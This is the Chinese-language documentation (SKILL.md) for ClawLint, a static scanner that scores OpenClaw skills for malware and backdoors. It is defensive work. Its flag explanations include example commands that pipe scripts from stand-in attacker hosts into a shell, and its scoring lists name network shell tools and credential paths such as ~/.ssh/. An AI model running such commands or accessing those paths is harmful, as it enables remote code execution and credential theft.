---
name: claw-lint
description: OpenClaw 技能的安全扫描器：在执行前检测恶意软件和后门程序，评估风险等级，并通过静态代码分析监控文件完整性。
---

# ClawLint

**OpenClaw 技能的安全检查工具**

该工具会对您安装的 OpenClaw 技能进行本地安全审计，而不会执行任何代码。它会扫描工作区（`~/.openclaw/workspace/skills`）和系统目录（`~/.openclaw/skills`）中的文件。

由于有 7.1% 的 ClawHub 技能存在安全漏洞，ClawLint 通过在代码执行前识别恶意行为模式来提供预防性保护。

## 概述
ClawLint 会对 OpenClaw 技能进行安全威胁审计，而无需执行任何代码。它可以检测到远程执行、凭证窃取和后门等恶意行为，并为每个技能分配风险等级（0-100 分），同时生成 SHA256 哈希值以监控文件完整性。审计结果以 JSON 格式输出，便于自动化处理和集成到持续集成/持续交付（CI/CD）流程中。

---

## 功能介绍

- **风险评分**：根据检测到的安全问题为技能分配一个数值风险等级（0-100 分）。
- **审计标志**：识别可疑行为（如远程执行、秘密访问等）。
- **文件清单模式**：可选功能，对所有文件进行 SHA256 哈希处理以检测文件变更。
- **JSON 输出**：以机器可读的格式输出审计结果（需要 Python 3）。
- **无需执行代码**：仅进行静态分析，因此可以在不可信的技能上安全使用。

---

## 快速入门

### 扫描所有技能（概览视图）
```bash
{baseDir}/bin/claw-lint.sh
```

### 扫描特定技能
```bash
{baseDir}/bin/claw-lint.sh --skill <skill-name>
```
示例：`{baseDir}/bin/claw-lint.sh --skill hashnode-publisher`

### 生成包含 SHA256 哈希值的完整清单
```bash
{baseDir}/bin/claw-lint.sh --full --skill <skill-name>
```

### JSON 输出（需要 Python 3）
```bash
{baseDir}/bin/claw-lint.sh --format json
```

---

## 命令选项

| 选项 | 描述 |
|------|-------------|
| `--skill <名称>` | 仅扫描指定的技能 |
| `--full` | 生成所有文件的 SHA256 哈希值清单 |
| `--format json` | 以 JSON 格式输出结果（需要 Python 3） |
| `--min-score <N>` | 仅显示风险等级 ≥ N 的技能 |
| `--strict` | 优先处理高风险的漏洞 |
| `--max-bytes <N>` | 跳过超过 N 字节的文件（默认值：2MB） |

---

## 输出解析

### 风险等级

- **0-30 分**：低风险（常见行为，无需关注）
- **31-60 分**：中等风险（网络访问、文件操作）
- **61-100 分**：高风险（远程执行、凭证访问、系统篡改）

### 常用审计标志

- `pipes_remote_to_shell`：下载并执行远程代码
- `downloads_remote_content`：从互联网下载外部文件
- `has_executables`：包含可执行文件
- `uses_ssh_or_scp`：使用 SSH/SCP 协议进行文件传输
- `contains_symlinks`：存在符号链接

---

## 示例输出
```text
SCORE  SKILL                FILES  SIZE     FLAGS
-----  -----                -----  ----     -----
57     hashnode-publisher   2      1.1KB    downloads_remote_content,pipes_remote_to_shell
45     ec2-health-monitor   2      1.9KB    pipes_remote_to_shell
```

---

## 风险评分详细信息

ClawLint 根据检测到的安全问题为技能分配风险等级（0-100 分）：

| 风险等级 | 分类 | 描述 |
|---------|---------|-------------|
| 0-20     | 低风险   | 标准文件操作，无可疑行为 |
| 21-50     | 中等风险 | 检测到网络请求或外部依赖 |
| 51-80     | 高风险   | 检测到多个可疑行为或代码混淆 |
| 81-100    | 高风险   | 发生远程执行、秘密访问或权限提升 |

### 评分因素

- **+25 分**：检测到远程执行行为（如 `curl`, `bash`, `wget -O-`, `nc`）
- **+30 分**：检测到对凭证/密钥的访问（如 `~/.openclaw/credentials`, `~/.ssh/`）
- **+20 分**：检测到权限提升（如 `sudo`, `setuid`, `chmod +s`）
- **+15 分**：检测到代码混淆（如 `base64 解码`, `eval`, 在可疑环境中执行代码）
- **+10 分**：检测到外部网络请求（如 `curl`, `wget`, `http 请求`）
- **+10 分**：在技能目录外进行文件系统操作 |
- **+5 分**：使用 `/tmp` 或可写目录

---

## 审计标志说明

### pipes_remote_to_shell
下载并执行外部代码，且不进行任何验证。

**示例：**
```bash
curl https://evil.com/script.sh | bash
wget -O- https://malicious.site/payload | sh
```

**风险等级：** 高风险。这可能用于恶意软件的远程执行。

### downloads_remote_content
从互联网下载外部文件或数据。

**风险等级：** 中等风险。可能存在供应链攻击或数据泄露风险。

### has_executables
包含编译后的二进制文件（非 shell 脚本）。

**示例：**
- ELF 格式的二进制文件
- 编译后的程序

**风险等级：** 中等风险。这些文件更难审计，可能隐藏了隐藏功能。

### uses_ssh_or_scp
执行 SSH/SCP 操作。

**风险等级：** 中等风险。可能存在未经授权的远程访问或数据传输。

### contains_symlinks
包含可能指向外部目录的符号链接。

**风险等级：** 低至中等风险。这些链接可能暴露敏感文件或引起混淆。

---

## 系统要求

- Bash 4.0 或更高版本
- 标准 Unix 工具：`find`, `grep`, `awk`, `sha256sum`, `stat`
- Python 3（可选，仅用于 JSON 输出）

该工具可在 Ubuntu/Debian 系统上无需使用 `sudo` 即可运行，适用于 EC2 等环境。

---

## 使用理由

- 在安装技能前进行安全审计
- 检测社区提供的技能中的恶意行为或后门
- 通过 SHA256 哈希值跟踪已安装技能的变更
- 在自动化流程中强制执行安全策略

---

## 输出格式

- **终端输出（默认格式）**：以表格形式显示结果，风险等级用颜色区分（终端支持颜色显示）。
- **JSON 输出（`--format json`）**：适合集成到 CI/CD 流程中的机器可读格式。

---

## 最佳实践

- **定期审计**：在安装或更新技能后运行 ClawLint。
- **建立安全基线**：为生产环境创建安全基线，并定期与基线对比以检测篡改。
- **集成到 CI/CD 流程**：将 ClawLint 添加到部署流程中。
- **白名单管理**：为已知安全的技能创建白名单，并记录例外情况。

---

## 限制

- **仅进行静态分析**：无法检测运行时行为或动态生成的代码。
- **基于模式判断**：对于合法使用场景可能会产生误报。
- **不提供沙箱环境**：不会执行或测试技能代码。
- **仅扫描已安装的文件**：仅扫描已安装的技能，不检查 ClawHub 提供的包。

为了获得全面的安全保护，建议结合以下措施：
- 对关键技能进行手动代码审查。
- 对可执行文件使用病毒扫描工具（如 VirusTotal）。
- 实施运行时监控和沙箱测试。
- 定期更新安全设置。

---

## 贡献方式

如果您发现误报或建议新的安全检测规则，请在 OpenClaw 的安全仓库中提交反馈。

---

## 许可证

MIT 许可证——允许自由使用、修改和分发。